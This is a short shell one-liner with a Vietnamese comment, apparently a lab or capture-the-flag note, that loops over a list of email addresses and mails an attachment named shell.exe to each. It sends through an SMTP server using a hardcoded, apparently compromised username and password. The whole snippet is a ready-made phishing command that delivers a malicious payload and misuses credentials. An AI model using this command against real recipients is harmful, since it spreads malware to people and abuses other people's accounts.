# gửi file shell.exe tới các email trong danh sách bằng sendemail khi có username và password
for email in $(cat emails.txt); do sendemail -f "lhedvig@brownbrick.co" -t "$email" -u "test" -m "test" -a shell.exe -s 10.10.118.67:25 -xu "lhedvig@brownbrick.co" -xp "bricks"; done
